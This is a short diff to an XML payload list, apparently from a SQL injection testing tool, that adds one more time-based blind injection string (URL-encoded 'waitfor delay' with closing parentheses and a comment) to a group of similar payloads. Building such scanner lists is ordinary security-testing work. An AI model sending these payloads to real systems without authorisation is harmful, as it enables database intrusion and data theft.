@@ -36,6 +36,7 @@
         <payload value="%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value=")%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value="')%20waitfor%20delay%20'0:0:5'%20--s"/>
+        <payload value="'))%20waitfor%20delay%20'0:0:5'%20--s"/>
     </dbms>
 
     <!-- Oracle -->
